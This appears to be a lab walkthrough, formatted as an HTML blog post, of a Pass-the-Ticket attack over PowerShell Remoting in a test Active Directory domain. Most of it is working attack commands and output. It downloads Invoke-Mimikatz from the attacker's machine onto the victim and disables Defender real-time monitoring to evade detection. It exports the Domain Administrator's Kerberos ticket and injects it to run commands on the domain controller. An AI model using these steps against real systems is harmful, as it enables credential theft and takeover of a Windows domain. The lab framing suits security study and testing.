I"T<h1 id="pass-the-ticket-over-psremoting-using-invoke-mimikatz"><span style="color:red">Pass-the-Ticket over PSRemoting using Invoke-Mimikatz</span></h1>

<hr />

<h2 id="environment-set-up">ENVIRONMENT SET-UP:</h2>
<h4 id="machines">MACHINES:</h4>

<div style="overflow-x:auto">
  <table>
    <tr>
      <th>HOSTNAME</th>
      <th>MACHINE IP</th>
      <th>OS</th>
      <th>REMARKS</th>
    </tr>
    <tr>
      <td>KALI-WINDOWS</td>
      <td>192.168.150.1</td>
      <td>Windows 10</td>
      <td>An Attacker Machine</td>
    </tr>
    <tr>
      <td>MSEDGEWIN10</td>
      <td>192.168.150.128</td>
      <td>Windows 10 Enterprise Evaluation</td>
      <td>A Remote Machine; Domain Computer</td>
    </tr>
    <tr>
      <td>BOSSMANBEN</td>
      <td>192.168.150.133</td>
      <td>Windows Server 2016</td>
      <td>A Domain Controller</td>
    </tr>
  </table>
</div>

<h4 id="users">USERS:</h4>

<div style="overflow-x:auto">
  <table>
    <tr>
      <th>USER</th>
      <th>MACHINE</th>
      <th>PRIVILEGES</th>
    </tr>
    <tr>
      <td>kali-windows</td>
      <td>KALI-WINDOWS</td>
      <td>Local Administrator</td>
    </tr>
    <tr>
      <td>BOSSMANBEN\\GConcy</td>
      <td>MSEDGEWIN10</td>
      <td>Local Administrator; Domain User</td>
    </tr>
    <tr>
      <td>BOSSMANBEN\\Administrator</td>
      <td>MSEDGEWIN10</td>
      <td>Domain Administrator</td>
    </tr>
  </table>
</div>

<hr />

<h2 id="assumptions">ASSUMPTIONS:</h2>

<h4 id="i-winrm-is-enabled-on-both-local-and-remote-machines">i. WinRM is enabled on both local and remote machines</h4>
<ol>
  <li>Both machines IPs are listed in each other’s trustedhosts</li>
  <li><code class="highlighter-rouge">-skipnetworkprofilecheck</code> is enabled (to allow connection over a public network)</li>
  <li>Proper firewall exceptions are in place in the remote machine</li>
</ol>

<h4 id="ii-the-remote-machine-is-part-of-a-domain-controller-bossmanben">ii. The remote machine is part of a Domain Controller (BOSSMANBEN)</h4>
<ol>
  <li>A domain user is a local administrator to the remote machine</li>
  <li>Credentials to the said domain user are known</li>
</ol>

<h4 id="iii-the-domain-administrator-has-logged-in-to-the-remote-machine-msedgewin10">iii. The Domain Administrator has logged in to the remote machine (MSEDGEWIN10)</h4>
<ol>
  <li>The logon action generates a ticket for the Domain Administrator</li>
  <li>The TGT expires over a definite period of time (6 hours in this case)</li>
  <li>Pass-the-Ticket could be done as long as the TGT hasn’t expired yet</li>
</ol>

<h4 id="iv-the-local-machine-kali-windows-can-communicate-with-the-remote-machine-msedgewin10">iv. The local machine (KALI-WINDOWS) can communicate with the remote machine (MSEDGEWIN10)</h4>

<hr />

<h2 id="exploitation">EXPLOITATION:</h2>

<h4 id="i-establish-a-session-using-psremoting">i. Establish a session using PSRemoting</h4>
<ol>
  <li>Enter a session for the domain user, <strong>BOSSMANBEN\GConcy</strong>:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">192.168.150.128</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">BOSSMANBEN\GConcy</span><span class="w">
</span></code></pre></div>    </div>
    <ul>
      <li>Enter the credentials for BOSSMANBEN\GConcy in the password prompt</li>
    </ul>
  </li>
  <li>Check for cached tickets using <code class="highlighter-rouge">klist</code>:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current LogonId is 0:0xc7fbc
Error calling API LsaCallAuthenticationPackage (ShowTickets substatus): 1312

klist failed with 0xc000005f/-1073741729: A specified logon session does not exist. It may already have been terminated.
</code></pre></div>    </div>
    <ul>
      <li>The current established session doesn’t seem to be a <strong><em>recognized</em></strong> session.</li>
    </ul>
  </li>
  <li>Register the current session while inside the PSSession created:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">GodConcy</span><span class="w"> </span><span class="nt">-RunAsCredential</span><span class="w"> </span><span class="nx">BOSSMANBEN\GConcy</span><span class="w">
</span></code></pre></div>    </div>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce a security 
boundary between different user sessions that are created by using this endpoint. Verify that the Windows PowerShell runspace 
configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has recently been 
unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session configurations that 
are created with the Register-PSSessionConfiguration cmdlet, are disconnected.


WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=GodConcy}                     GodConcy
...omitted...
</code></pre></div>    </div>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Get-PSSessionConfiguration</span><span class="w">
</span></code></pre></div>    </div>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name          : GodConcy
PSVersion     : 5.1
StartupScript :
RunAsUser     : BOSSMANBEN\GConcy
Permission    : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
   
...omitted...
</code></pre></div>    </div>
    <ul>
      <li>Enter the credentials for BOSSMANBEN\GConcy in the password prompt</li>
    </ul>
  </li>
  <li>Run <code class="highlighter-rouge">klist</code> again:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current LogonId is 0:0xc7fbc

Cached Tickets: (0)
</code></pre></div>    </div>
    <ul>
      <li><code class="highlighter-rouge">klist</code> can now check for cached tickets</li>
      <li>Passing exported tickets using <code class="highlighter-rouge">Invoke-Mimikatz</code> would throw the same error from the previous <code class="highlighter-rouge">klist</code> if a proper session is not configured.</li>
      <li>Even if an Administrator ticket was passed successfully, passing commands in or accessing the Domain Controller would be denied
        <ul>
          <li>The entire session should be restarted with the proper configuration.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Type <code class="highlighter-rouge">Restart-Service WinRM</code> then enter a new PSSession with the registered configuration:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">192.168.150.128</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">BOSSMANBEN\GConcy</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="nx">GodConcy</span><span class="w">
</span></code></pre></div>    </div>
    <ul>
      <li>The shell will terminate after restarting the service.</li>
      <li>Enter the credentials for BOSSMANBEN\GConcy in the password prompt</li>
    </ul>
  </li>
  <li>Run <code class="highlighter-rouge">klist</code> again:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current LogonId is 0:0xd0ebf

Cached Tickets: (1)

#0&gt;     Client: GConcy @ BOSSMANBEN.LOCAL
        Server: krbtgt/BOSSMANBEN.LOCAL @ BOSSMANBEN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/12/2019 15:42:59 (local)
        End Time:   7/13/2019 1:42:59 (local)
        Renew Time: 7/19/2019 15:42:59 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called: WIN-BO2CT95INDP
</code></pre></div>    </div>
    <ul>
      <li>The session now actually runs as the user, <strong>BOSSMANBEN\GConcy</strong></li>
      <li>This session now eliminates the <strong>double hop</strong> problem:
        <ul>
          <li>Instead of the local machine sending a request to the remote machine before reaching the server, the local machine is now acting as or impersonating the remote machine running as the user <strong>BOSSMANBEN\GConcy</strong>.</li>
          <li>Since the local machine (KALI-WINDOWS) now acts like the remote machine (MSEDGEWIN10), it would seem like the requests sent from the local machine are now going directly to the Domain Controller (BOSSMANBEN).</li>
          <li>The two previous statement would be useful since the goal of this exploit is to reach the Domain Controller (BOSSMANBEN) using the local machine (KALI-WINDOWS) “without jumping” from the remote machine (MSEDGEWIN10)</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h4 id="ii-export-krbtgt-tickets-using-invoke-mimikatz">ii. Export krbtgt tickets using Invoke-Mimikatz:</h4>

<ol>
  <li>Download the exploit to the local machine (KALI-WINDOWS):
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/samratashok/nishang</span><span class="w">

</span><span class="nf">cd</span><span class="w"> </span><span class="o">.</span><span class="nx">\nishang\Gather</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Upload <strong>Invoke-Mimikatz.powershell</strong> to the remote machine (MSEDGEWIN10):
    <ul>
      <li>LOCAL MACHINE (KALI-WINDOWS):
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer
</code></pre></div>        </div>
      </li>
      <li>PSSession (MSEDGEWIN10):
        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">cd</span><span class="w"> </span><span class="nv">$home</span><span class="nx">\Desktop</span><span class="w">

</span><span class="nf">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://192.168.150.1:8000/Invoke-Mimikatz.powershell</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">Invoke-Mimikatz.powershell</span><span class="w">
</span></code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Use dot source to import  <strong>Invoke-Mimikatz</strong>:
    <ul>
      <li>PSSession (MSEDGEWIN10):
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-MpPreference -DisableRealtimeMonitoring $true

. .\Invoke-Mimikatz.powershell
</code></pre></div>        </div>
        <ul>
          <li><code class="highlighter-rouge">-DisableRealtimeMonitoring $true</code> prevents the remote machine from detecting <strong>Invoke-Mimikatz.powershell</strong> as a malicious script</li>
        </ul>

        <p><span></span></p>
      </li>
    </ul>
  </li>
  <li>Export <strong><em>krbtgt tickets</em></strong> using Invoke-Mimikatz:
    <ul>
      <li>PSSession (MSEDGEWIN10):
        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mkdir</span><span class="w"> </span><span class="nx">tickets</span><span class="w">

</span><span class="nf">cd</span><span class="w"> </span><span class="nx">tickets</span><span class="w">

</span><span class="nf">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s1">'"sekurlsa::tickets /export"'</span><span class="w">
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::tickets /export

...omitted...

Authentication Id : 0 ; 303469 (00000000:0004a16d)
Session           : Interactive from 1
User Name         : Administrator
Domain            : BOSSMANBEN
Logon Server      : WIN-BO2CT95INDP
Logon Time        : 7/12/2019 4:37:50 PM
SID               : S-1-5-21-2817836110-3135048609-2922248965-500

        * Username : Administrator
        * Domain   : BOSSMANBEN.LOCAL
        * Password : (null)

       Group 0 - Ticket Granting Service
        [00000000]
          Start/End/MaxRenew: 7/12/2019 4:38:17 PM ; 7/13/2019 2:38:17 AM ; 7/19/2019 4:38:17 PM
          Service Name (02) : LDAP ; WIN-BO2CT95INDP.bossmanben.local ; bossmanben.local ; @ BOSSMANBEN.LOCAL
          Target Name  (02) : LDAP ; WIN-BO2CT95INDP.bossmanben.local ; bossmanben.local ; @ BOSSMANBEN.LOCAL
          Client Name  (01) : Administrator ; @ BOSSMANBEN.LOCAL ( BOSSMANBEN.LOCAL )
          Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
          Session Key       : 0x00000012 - aes256_hmac
            4050506d21e637246324747b2d8a26a69a195020adc6bb715f19441a80075302
          Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
          * Saved to file [0;4a16d]-0-0-40a50000-Administrator@LDAP-WIN-BO2CT95INDP.bossmanben.local.kirbi !

       Group 1 - Client Ticket ?

       Group 2 - Ticket Granting Ticket
        [00000000]
          Start/End/MaxRenew: 7/12/2019 4:38:17 PM ; 7/13/2019 2:38:17 AM ; 7/19/2019 4:38:17 PM
          Service Name (02) : krbtgt ; BOSSMANBEN.LOCAL ; @ BOSSMANBEN.LOCAL
          Target Name  (02) : krbtgt ; BOSSMANBEN ; @ BOSSMANBEN.LOCAL
          Client Name  (01) : Administrator ; @ BOSSMANBEN.LOCAL ( BOSSMANBEN )
          Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
          Session Key       : 0x00000012 - aes256_hmac
            0d397fbecc40d64ac4c5852da47f10f9f757b2db4beaef1e8cdd2bb911ab8605
          Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
          * Saved to file [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi !
    
...omitted...
</code></pre></div>        </div>
        <ul>
          <li>A krbtgt ticket for the Domain (BOSSMANBEN.LOCAL) Administrator was exported</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h4 id="iii-pass-the-ticket-using-invoke-mimikatz">iii. Pass the ticket using Invoke-Mimikatz</h4>

<ol>
  <li>View the exported tickets:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">dir</span><span class="w"> </span><span class="nv">$home</span><span class="nx">\Desktop\tickets</span><span class="w">
</span></code></pre></div>    </div>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
-a----       12/07/2019   4:53 PM           1611 [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi
...omitted...
</code></pre></div>    </div>
  </li>
  <li>Pass the krbtgt ticket:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s1">'"kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi"'</span><span class="w">
</span></code></pre></div>    </div>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi

* File: '[0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi': OK
</code></pre></div>    </div>
  </li>
  <li>View the cached tickets using <code class="highlighter-rouge">klist</code>:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current LogonId is 0:0xd0ebf

Cached Tickets: (1)

#0&gt;     Client: Administrator @ BOSSMANBEN.LOCAL
        Server: krbtgt/BOSSMANBEN.LOCAL @ BOSSMANBEN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/12/2019 16:38:17 (local)
        End Time:   7/13/2019 2:38:17 (local)
        Renew Time: 7/19/2019 16:38:17 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called:
</code></pre></div>    </div>
    <ul>
      <li>The current ticket for the session is now <code class="highlighter-rouge">Administrator @ BOSSMANBEN.LOCAL</code> which is a Domain Administrator</li>
      <li>The current PSSession should now be able to impersonate the Domain Administrator</li>
    </ul>

    <p><span></span></p>
  </li>
  <li>Check if the Domain Controller (BOSSMANBEN) now accessible:
    <ul>
      <li>Get the Primary Domain Controller for BOSSMANBEN:
        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">nltest</span><span class="w"> </span><span class="nx">/DCNAME:BOSSMANBEN</span><span class="w">
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PDC for Domain BOSSMANBEN is \\WIN-BO2CT95INDP
The command completed successfully
</code></pre></div>        </div>
      </li>
      <li>List contents of the file share, <code class="highlighter-rouge">C$</code>:
        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">dir</span><span class="w"> </span><span class="nx">\\WIN-BO2CT95INDP\C</span><span class="err">$</span><span class="w">
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   
    Directory: \\WIN-BO2CT95INDP\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       16/07/2016   6:23 AM                PerfLogs
d-r---       09/07/2019   3:01 PM                Program Files
d-----       16/07/2016   6:23 AM                Program Files (x86)
d-r---       09/07/2019   3:01 PM                Users
d-----       09/07/2019   3:10 PM                Windows
-a----       11/07/2019  12:53 PM              5 gg

</code></pre></div>        </div>
      </li>
      <li>Pass commands as the Domain Administrator:
        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">WIN-BO2CT95INDP</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nf">whoami</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bossmanben\administrator
</code></pre></div>        </div>

        <ul>
          <li>The file shares in the Domain Controller (BOSSMANBEN) are now accessible as long as the Domain Controller is being accessed using kerberos authentication.</li>
          <li>Commands could also now be executed in the context of the Domain Controller (BOSSMANBEN) using the <code class="highlighter-rouge">Invoke-Command</code> module in PowerShell.</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>
:ET